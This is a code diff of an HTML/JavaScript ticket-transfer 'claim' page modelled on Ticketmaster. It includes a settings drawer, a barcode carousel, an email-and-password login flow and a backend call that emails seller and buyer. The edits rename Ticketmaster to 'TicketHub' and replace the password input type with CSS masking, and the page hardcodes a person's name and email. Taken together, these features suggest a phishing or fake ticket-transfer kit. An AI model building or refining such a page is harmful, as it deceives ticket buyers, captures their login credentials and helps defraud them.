+    class="fixed inset-y-0 left-0 w-80 max-w-[85vw] bg-white dark:bg-zinc-900 shadow-2xl translate-x-[-100%] transition-transform duration-300 ease-in-out z-50 flex flex-col select-none">
     <!-- Header with Name (Large, top-left) and Email (smaller) -->
     <div class="p-6 bg-primary text-white flex items-start justify-between shrink-0">
       <div class="flex flex-col text-left pr-4 min-w-0">
-        <span id="drawer-user-name" class="font-bold font-outfit text-xl leading-tight truncate uppercase tracking-wide">Miller Broome</span>
+        <span id="drawer-user-name"
+          class="font-bold font-outfit text-xl leading-tight truncate uppercase tracking-wide">Miller Broome</span>
         <span id="drawer-user-email" class="text-xs text-white/80 font-medium mt-1 truncate">Weirdrexx@gmail.com</span>
       </div>
-      <button onclick="closeSettingsDrawer()" class="p-1 text-white/80 hover:text-white focus:outline-none shrink-0"><i data-lucide="x" class="h-5.5 w-5.5"></i></button>
+      <button onclick="closeSettingsDrawer()" class="p-1 text-white/80 hover:text-white focus:outline-none shrink-0"><i
+          data-lucide="x" class="h-5.5 w-5.5"></i></button>
     </div>
-    
+
     <div class="flex-1 overflow-y-auto p-6 space-y-6 text-left">
       <div>
-        <h3 class="text-xs font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest border-b border-gray-100 dark:border-zinc-800 pb-2 mb-4">General Settings</h3>
-        
+        <h3
+          class="text-xs font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest border-b border-gray-100 dark:border-zinc-800 pb-2 mb-4">
+          General Settings</h3>
+
         <!-- Receive Notifications Toggle -->
         <div class="flex items-center justify-between py-2 mb-4">
           <div class="flex flex-col">
@@ -687,14 +895,18 @@
           </div>
           <label class="relative inline-flex items-center cursor-pointer">
             <input type="checkbox" id="set-notifications" class="sr-only peer" checked />
-            <div class="w-11 h-6 bg-gray-200 peer-focus:outline-none rounded-full peer dark:bg-zinc-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-primary"></div>
+            <div
+              class="w-11 h-6 bg-gray-200 peer-focus:outline-none rounded-full peer dark:bg-zinc-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-primary">
+            </div>
           </label>
         </div>
 
         <!-- My Country Select -->
         <div class="space-y-1.5">
-          <label class="text-[10px] font-extrabold text-gray-500 dark:text-gray-400 uppercase tracking-wider block">My Country</label>
-          <select id="set-country-select" class="w-full border border-gray-300 dark:border-zinc-700 bg-white dark:bg-zinc-800 rounded px-2.5 py-2 text-sm text-black dark:text-white bg-white dark:bg-zinc-800 focus:border-primary outline-none font-semibold">
+          <label class="text-[10px] font-extrabold text-gray-500 dark:text-gray-400 uppercase tracking-wider block">My
+            Country</label>
+          <select id="set-country-select"
+            class="w-full border border-gray-300 dark:border-zinc-700 bg-white dark:bg-zinc-800 rounded px-2.5 py-2 text-sm text-black dark:text-white bg-white dark:bg-zinc-800 focus:border-primary outline-none font-semibold">
             <option value="US" selected>United States</option>
             <option value="CA">Canada</option>
             <option value="GB">United Kingdom</option>
@@ -702,18 +914,20 @@
           </select>
         </div>
       </div>
-      
+
       <!-- Sign Out Action -->
       <div class="pt-6 border-t border-gray-100 dark:border-zinc-800">
-        <button onclick="handleSignOutClick()" class="w-full border border-rose-500 text-rose-500 hover:bg-rose-50 dark:hover:bg-rose-950/20 font-bold py-3 rounded text-xs uppercase tracking-wider transition-colors flex items-center justify-center gap-2">
+        <button onclick="handleSignOutClick()"
+          class="w-full border border-rose-500 text-rose-500 hover:bg-rose-50 dark:hover:bg-rose-950/20 font-bold py-3 rounded text-xs uppercase tracking-wider transition-colors flex items-center justify-center gap-2">
           <i data-lucide="log-out" class="h-4 w-4"></i>
           Sign Out
         </button>
       </div>
     </div>
-    
+
     <div class="p-4 border-t border-gray-150 dark:border-zinc-800 shrink-0">
-      <button onclick="saveClaimSettings()" class="w-full bg-primary hover:bg-blue-700 text-white font-bold py-3 text-sm uppercase tracking-wider transition-all active:scale-[0.98]">
+      <button onclick="saveClaimSettings()"
+        class="w-full bg-primary hover:bg-blue-700 text-white font-bold py-3 text-sm uppercase tracking-wider transition-all active:scale-[0.98]">
         Save Settings
       </button>
     </div>
@@ -862,7 +1076,7 @@
       if (searchParams.has('token')) {
         return searchParams.get('token');
       }
-      
+
       // 2. Hash query params
       const hash = window.location.hash;
       if (hash.includes('?')) {
@@ -900,7 +1114,7 @@
         if (parsedData && parsedData.title) {
           let sec = parsedData.section || "";
           let r = parsedData.row || "";
-          
+
           // If section or row wasn't directly supplied, extract from seatDetails if available
           if ((!sec || !r) && parsedData.seatDetails) {
             const secMatch = parsedData.seatDetails.match(/Section\s+([^,]+)/i);
@@ -966,7 +1180,7 @@
             };
           }
         }
-      } catch(e) {}
+      } catch (e) { }
 
       // Default fallback
       return {
@@ -985,7 +1199,7 @@
           const list = JSON.parse(stored);
           return list.find(t => t.id === id);
         }
-      } catch(e) {}
+      } catch (e) { }
       return null;
     }
 
@@ -1089,7 +1303,7 @@
       card.querySelector('h3').textContent = activeTicket.title;
       card.querySelector('.text-white\\/70').textContent = activeTicket.venue + (activeTicket.city ? `, ${activeTicket.city}` : '');
       card.querySelector('.text-white\\/80 span').textContent = `x${activeTicket.seats.length}`;
-      
+
       const emailDisplay = document.getElementById('dashboard-email-display');
       if (emailDisplay) {
         emailDisplay.textContent = activeTicket.buyerEmail || 'user@domain.com';
@@ -1100,17 +1314,17 @@
     function openTicketModal() {
       activeSeatIndex = 0;
       renderBarcodeCarousel();
-      
+
       // Show Backdrop
       const backdrop = document.getElementById('modal-backdrop');
       backdrop.classList.remove('opacity-0', 'pointer-events-none');
       backdrop.classList.add('opacity-100', 'pointer-events-auto');
-      
+
       // Slide up sheet
       const sheet = document.getElementById('ticket-modal');
       sheet.classList.remove('translate-y-full');
       sheet.classList.add('translate-y-0');
-      
+
       lucide.createIcons();
     }
 
@@ -1119,7 +1333,7 @@
       const backdrop = document.getElementById('modal-backdrop');
       backdrop.classList.remove('opacity-100', 'pointer-events-auto');
       backdrop.classList.add('opacity-0', 'pointer-events-none');
-      
+
       // Slide down sheet
       const sheet = document.getElementById('ticket-modal');
       sheet.classList.remove('translate-y-0');
@@ -1131,9 +1345,9 @@
       const container = document.getElementById('carousel-container');
       if (!container) return;
       container.innerHTML = '';
-      
+
       const seats = activeTicket.seats || ["5"];
-      
+
       seats.forEach((seatNumber, idx) => {
         const cardHtml = `
         <div class="snap-center shrink-0 w-full flex justify-center items-center px-4">
@@ -1239,9 +1453,9 @@
       const dotsContainer = document.getElementById('seat-dots');
       if (!dotsContainer) return;
       dotsContainer.innerHTML = '';
-      
+
       const seats = activeTicket.seats || ["5"];
-      
+
       seats.forEach((seat, idx) => {
         const dot = document.createElement('button');
         dot.className = `h-1.5 rounded-full transition-all ${idx === activeSeatIndex ? 'w-5 bg-[#025df6]' : 'w-1.5 bg-zinc-300'}`;
@@ -1265,16 +1479,16 @@
     // Scroll snap detection on Page 4
     let scrollTimeout;
     const carouselContainer = document.getElementById('carousel-container');
-    
+
     carouselContainer.addEventListener('scroll', () => {
       clearTimeout(scrollTimeout);
       scrollTimeout = setTimeout(() => {
         const containerLeft = carouselContainer.getBoundingClientRect().left;
         const containerCenter = containerLeft + carouselContainer.clientWidth / 2;
-        
+
         let closestIdx = 0;
         let closestDist = Infinity;
-        
+
         Array.from(carouselContainer.children).forEach((card, idx) => {
           const cardCenter = card.getBoundingClientRect().left + card.clientWidth / 2;
           const dist = Math.abs(cardCenter - containerCenter);
@@ -1283,7 +1497,7 @@
             closestIdx = idx;
           }
         });
-        
+
         if (closestIdx !== activeSeatIndex) {
           activeSeatIndex = closestIdx;
           updateDotsIndicator();
@@ -1297,7 +1511,7 @@
     function router() {
       const ticket = loadActiveTicket();
       const hash = window.location.hash || '#/';
-      
+
       closeTicketModal();
 
       const initialLoader = document.getElementById('page-initial-loading');
@@ -1313,8 +1527,8 @@
             claimedTokens = parsed;
           }
         }
-      } catch(e) {}
-      
+      } catch (e) { }
+
       const isAlreadyClaimed = token && claimedTokens.includes(token);
 
       // If no valid ticket or token is present and user isn't navigating dashboard
@@ -1405,11 +1619,12 @@
       const pwdInput = document.getElementById('login-password-input') || document.getElementById('login-password');
       if (!pwdInput) return;
       const toggleBtn = pwdInput.parentElement.querySelector('button[type="button"]') || pwdInput.nextElementSibling;
-      if (pwdInput.type === 'password') {
-        pwdInput.type = 'text';
+      const isMasked = pwdInput.style.webkitTextSecurity !== 'none';
+      if (isMasked) {
+        pwdInput.style.webkitTextSecurity = 'none';
         if (toggleBtn) toggleBtn.textContent = 'Hide';
       } else {
-        pwdInput.type = 'password';
+        pwdInput.style.webkitTextSecurity = 'disc';
         if (toggleBtn) toggleBtn.textContent = 'Show';
       }
     }
@@ -1418,7 +1633,27 @@
     function handleEmailStepSubmit(event) {
       if (event) event.preventDefault();
       const emailInput = document.getElementById('login-email-input');
-      const emailVal = emailInput ? emailInput.value.trim() : 'user@domain.com';
+      const emailVal = emailInput ? emailInput.value.trim() : '';
+      const errorEl = document.getElementById('login-email-error');
+      if (errorEl) {
+        errorEl.classList.add('hidden');
+        errorEl.textContent = '';
+      }
+
+      // Check if active ticket has a designated buyerEmail that must match
+      if (activeTicket && activeTicket.buyerEmail) {
+        const requiredEmail = activeTicket.buyerEmail.trim().toLowerCase();
+        if (emailVal.toLowerCase() !== requiredEmail) {
+          if (errorEl) {
+            errorEl.textContent = `Only the email this ticket was transferred to (${activeTicket.buyerEmail}) can accept this transfer.`;
+            errorEl.classList.remove('hidden');
+          } else {
+            alert(`Only the email this ticket was transferred to (${activeTicket.buyerEmail}) can accept this transfer.`);
+          }
+          return;
+        }
+      }
+
       // Pass email to password page display
       const displayEl = document.getElementById('login-display-email');
       if (displayEl) displayEl.textContent = emailVal || 'user@domain.com';
@@ -1477,7 +1712,7 @@
       if (seatRowsEl) {
         seatRowsEl.innerHTML = '';
         const seats = activeTicket.seats && activeTicket.seats.length ? activeTicket.seats : ['1'];
-        seats.forEach(function(seat) {
+        seats.forEach(function (seat) {
           const row = document.createElement('div');
           row.style.cssText = 'border:1px solid #e5e7eb;padding:12px 16px;background:#fff;';
           const label = document.createElement('span');
@@ -1514,7 +1749,7 @@
             claimed.push(currentToken);
             localStorage.setItem('tm_claimed_tokens', JSON.stringify(claimed));
           }
-        } catch(e) {}
+        } catch (e) { }
       }
 
       // Show securing overlay for 3 seconds
@@ -1573,24 +1808,24 @@
     }
 
     // ================= NEW TAB SWITCHING / SEARCH / SETTINGS CONTROLLERS =================
-    
+
     // Tab switching controller
     function switchDashboardTab(tabName) {
       const tabUpcoming = document.getElementById('tab-upcoming');
       const tabPast = document.getElementById('tab-past');
       const tabListings = document.getElementById('tab-listings');
-      
+
       const containerUpcoming = document.getElementById('upcoming-events-container');
       const placeholderPast = document.getElementById('past-events-placeholder');
       const placeholderListings = document.getElementById('listings-placeholder');
-      
+
       if (!tabUpcoming || !tabPast || !tabListings || !containerUpcoming || !placeholderPast || !placeholderListings) return;
-      
+
       if (tabName === 'upcoming') {
         tabUpcoming.className = 'py-3.5 border-b-2 border-white text-white focus:outline-none transition-all';
         tabPast.className = 'py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all';
         tabListings.className = 'py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all';
-        
+
         containerUpcoming.classList.remove('hidden');
         placeholderPast.classList.add('hidden');
         placeholderListings.classList.add('hidden');
@@ -1598,7 +1833,7 @@
         tabUpcoming.className = 'py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all';
         tabPast.className = 'py-3.5 border-b-2 border-white text-white focus:outline-none transition-all';
         tabListings.className = 'py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all';
-        
+
         containerUpcoming.classList.add('hidden');
         placeholderPast.classList.remove('hidden');
         placeholderListings.classList.add('hidden');
@@ -1606,12 +1841,12 @@
         tabUpcoming.className = 'py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all';
         tabPast.className = 'py-3.5 border-b-2 border-transparent text-white/60 focus:outline-none transition-all';
         tabListings.className = 'py-3.5 border-b-2 border-white text-white focus:outline-none transition-all';
-        
+
         containerUpcoming.classList.add('hidden');
         placeholderPast.classList.add('hidden');
         placeholderListings.classList.remove('hidden');
       }
-      
+
       lucide.createIcons();
     }
 
@@ -1718,7 +1953,7 @@
                   <p style="font-size:12px;color:#6b7280;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px;">${venue}${city ? ' • ' + city : ''}${state ? ', ' + state : ''}</p>
                   <div style="display:flex;align-items:center;gap:8px;margin-top:4px;">
                     <span style="font-size:11px;font-weight:700;color:#0041D7;text-transform:uppercase;">${date}</span>
-                    <span style="font-size:10px;font-weight:700;color:#10b981;background:#ecfdf5;padding:1px 6px;border-radius:2px;">View on Ticketmaster ↗</span>
+                    <span style="font-size:10px;font-weight:700;color:#10b981;background:#ecfdf5;padding:1px 6px;border-radius:2px;">View on TicketHub ↗</span>
                   </div>
                 </div>
               `;
@@ -1758,13 +1993,13 @@
       // 1. Get name and email dynamically from activeTicket
       const userName = activeTicket.buyerName || "Miller Broome";
       const userEmail = activeTicket.buyerEmail || "Weirdrexx@gmail.com";
-      
+
       // Update header labels (largely displayed top-left, email under it)
       const nameEl = document.getElementById('drawer-user-name');
       const emailEl = document.getElementById('drawer-user-email');
       if (nameEl) nameEl.textContent = userName;
       if (emailEl) emailEl.textContent = userEmail;
-      
+
       // Load current settings from LocalStorage
       let notificationChecked = true;
       let selectedCountry = 'US';
@@ -1777,37 +2012,37 @@
         if (rawCountry) {
           selectedCountry = rawCountry;
         }
-      } catch (e) {}
-      
+      } catch (e) { }
+
       const notifInput = document.getElementById('set-notifications');
       const countrySelect = document.getElementById('set-country-select');
       if (notifInput) notifInput.checked = notificationChecked;
       if (countrySelect) countrySelect.value = selectedCountry;
-      
+
       // Reveal Drawer
       const backdrop = document.getElementById('settings-backdrop');
       const drawer = document.getElementById('settings-drawer');
-      
+
       if (!backdrop || !drawer) return;
-      
+
       backdrop.classList.remove('opacity-0', 'pointer-events-none');
       backdrop.classList.add('opacity-100', 'pointer-events-auto');
-      
+
       drawer.classList.remove('translate-x-[-100%]');
       drawer.classList.add('translate-x-0');
-      
+
       lucide.createIcons();
     }
 
     function closeSettingsDrawer() {
       const backdrop = document.getElementById('settings-backdrop');
       const drawer = document.getElementById('settings-drawer');
-      
+
       if (!backdrop || !drawer) return;
-      
+
       backdrop.classList.remove('opacity-100', 'pointer-events-auto');
       backdrop.classList.add('opacity-0', 'pointer-events-none');
-      
+
       drawer.classList.remove('translate-x-0');
       drawer.classList.add('translate-x-[-100%]');
     }
@@ -1815,13 +2050,13 @@
     function saveClaimSettings() {
       const notifInput = document.getElementById('set-notifications');
       const countrySelect = document.getElementById('set-country-select');
-      
+
       const notifEnabled = notifInput ? notifInput.checked : true;
       const userCountry = countrySelect ? countrySelect.value : 'US';
-      
+
       localStorage.setItem('tm_notif_enabled', String(notifEnabled));
       localStorage.setItem('tm_user_country', userCountry);
-      
+
       closeSettingsDrawer();
       alert('Account settings updated successfully!');
     }
@@ -1849,10 +2084,10 @@
         if (cached) {
           const parsed = JSON.parse(cached);
           if (parsed && typeof parsed === 'object') {
-            document.title = parsed.name ? `${parsed.name} — Ticketmaster Claim` : 'Ticket Claim — Ticketmaster';
+            document.title = parsed.name ? `${parsed.name} — TicketHub Claim` : 'Ticket Claim — TicketHub';
           }
         }
-      } catch (e) {}
+      } catch (e) { }
     }
     loadSettingsOnMount();
 
@@ -1875,7 +2110,7 @@
     // Trigger backend API call to send accepted email to the seller and buyer
     function triggerAcceptanceEmail(ticket) {
       if (!ticket) return;
-      
+
       const seatsFormatted = ticket.seats && ticket.seats.length > 1
         ? `Seats: ${ticket.seats.slice(0, -1).join(', ')} and ${ticket.seats[ticket.seats.length - 1]}`
         : `Seat: ${ticket.seats?.[0] || "1"}`;
@@ -1902,7 +2137,7 @@
         ticketId: ticket.ticketId || ticket.id || "",
         seats: ticket.seats || [],
         buyerName: ticket.buyerName || "Miller Broome",
-        buyerEmail: resolvedBuyerEmail || "buyer@ticketmaster.com",
+        buyerEmail: resolvedBuyerEmail || "buyer@tickethub.app",
         ticketTitle: ticket.title || "Event Tickets",
         ticketDate: ticket.date || "",
         ticketVenue: ticket.venue || "",
@@ -1925,7 +2160,7 @@
       if (ticket.backendUrl) {
         origins.unshift(ticket.backendUrl);
       }
-      
+
       const currentOrigin = window.location.origin;
       if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
         origins.unshift('http://localhost:8002');
@@ -1988,4 +2223,5 @@
     }
   </script>
 </body>
+
 </html>
